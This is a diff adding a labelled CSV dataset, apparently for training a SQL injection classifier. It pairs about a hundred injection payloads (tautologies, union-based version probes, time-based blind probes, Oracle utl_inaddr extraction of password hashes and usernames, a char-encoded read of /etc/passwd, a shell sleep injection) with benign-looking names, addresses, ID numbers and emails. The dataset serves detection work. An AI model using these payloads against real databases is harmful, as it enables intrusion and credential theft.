@@ -1,0 +1,201 @@
+Query,Label
+""" or pg_sleep  (  __TIME__  )  --",1
+create user name identified by pass123 temporary tablespace temp default tablespace users;,1
+" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
+" select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1
+" select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1
+ select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1
+select * from users where id  =  1 +$+ or 1  =  1 -- 1,1
+"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
+" select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",1
+" select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",1
+? or 1  =  1 --,1
+ )   or   (  'a'  =  'a,1
+admin' or 1  =  1#,1
+" select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",1
+or 1  =  1 --,1
+" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
+" select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1
+" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",1
+" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1
+distinct,1
+select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1
+"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
+select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1
+"admin"" or ""1""  =  ""1""--",1
+" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1
+insert,1
+" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1
+" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1
+" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
+" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1
+"or 1  =  1 or """"  =  ",1
+/**/or/**/1/**/  =  /**/1,1
+" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1
+" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1
+" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1
+or 1  =  1/*,1
+%27 or 1  =  1,1
+" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1
+" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1
+"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1
+" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1
+select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1
+" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1
+" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1
+" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1
+select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1
+" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1
+" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1
+" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1
+or 1 --',1
+" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1
+"admin"" or 1  =  1#",1
+" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1
+\x27UNION SELECT,1
+PRINT,1
+" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1
+or 1  =  1--,1
+1 or pg_sleep  (  __TIME__  )  --,1
+" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1
+admin'  )   or   (  '1'  =  '1'/*,1
+or 2 between 1 and 3,1
+" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1
+" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1
+admin' or '1'  =  '1,1
+; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1
+" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1
+""" or 0  =  0 --",1
+" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1
+select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1
+" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1
+" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1
+" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1
+char%4039%41%2b%40SELECT,1
+" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1
+admin'  )   or   (  '1'  =  '1,1
+declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1
+"or 0  =  0 #""",1
+" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1
+  )   or   (  'x'  =  'x,1
+" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1
+$  (  sleep 50  ) ,1
+" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1
+"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1
+" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1
+" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1
+" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1
+"""a"""" or 1  =  1--""",1
+" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1
+" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
+" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1
+1 and user_name  (    )     =   'dbo',1
+"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1
+" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1
+" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1
+select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1
+select * from users where id  =  1 +$+. or 1  =  1 -- 1,1
+select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1
+" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
+or 1  =  1 or ''  =  ',1
+99745017c,0
+ejerci78,0
+47209,0
+"calle valencia de don juan 161, 7?d",0
+b3r3al,0
+46942381w,0
+elder@parcalia.hn,0
+24596413y,0
+compte,0
+2366,0
+leshowit,0
+lehar,0
+45699398p,0
+"calle profesor angel lacalle, s/n,",0
+tardn,0
+3.54937E+15,0
+14100,0
+rigby,0
+caada del hoyo,0
+45641,0
+englert,0
+threader,0
+elias pallares,0
+f1581il2ente,0
+57317186j,0
+bocana$da,0
+escarpelo,0
+43785,0
+3.4008E+15,0
+lu,0
+"calle limones, 60,",0
+hana,0
+dillard,0
+casas de miravete,0
+olea de boedo,0
+empuar,0
+0o380ado6,0
+montroy,0
+99997973e,0
+8.36404E+15,0
+"grupo fuensanta 197, 12?a",0
+jalance,0
+4.20136E+14,0
+"c/ ricardo gutierrez 26, 8-d",0
+ivancevi,0
+castil de vela,0
+genaro,0
+ergasto,0
+"llosa de ranes, la",0
+es2eri5o,0
+cuenca,0
+02054707w,0
+21184515c,0
+5.71439E+15,0
+41110,0
+marcano giner,0
+lemoine5@informatica2009.zr,0
+pr3caz,0
+37130,0
+marsh@comerciosaspe.ke,0
+inescourt7@citycvs.mil,0
+"c/ julia minguillon, 179, 7-a",0
+obsequ.iosa,0
+"calle carlos amel, 32, 12?h",0
+kallewar,0
+59760678p,0
+5240,0
+toperzer1,0
+canaan,0
+suzuki,0
+"antigua de ancora s/n,",0
+"calle dean miranda 106, 6-f",0
+10380,0
+madgett,0
+gerola pugliesi,0
+36574,0
+"c/ comedias, 109,",0
+8.61689E+15,0
+tanchak,0
+"don quijote 81,",0
+ceferina,0
+saturnino,0
+israel_piggot@joyclub.pe,0
+5n37do,0
+lanfranchi@getgold.tl,0
+micaas,0
+herrmann@codwatw.edu,0
+9.48E+15,0
+5.83899E+15,0
+ajoy,0
+irissou,0
+quisto,0
+s5bal850de,0
+balsam-prey@mmo.com.cat,0
+lurlene,0
+"c/ elvas 112, 13-a",0
+"de canoves 13,",0
+hembrick,0
+1.76488E+15,0
+darcy@google-movil.dz,0
+katia,0
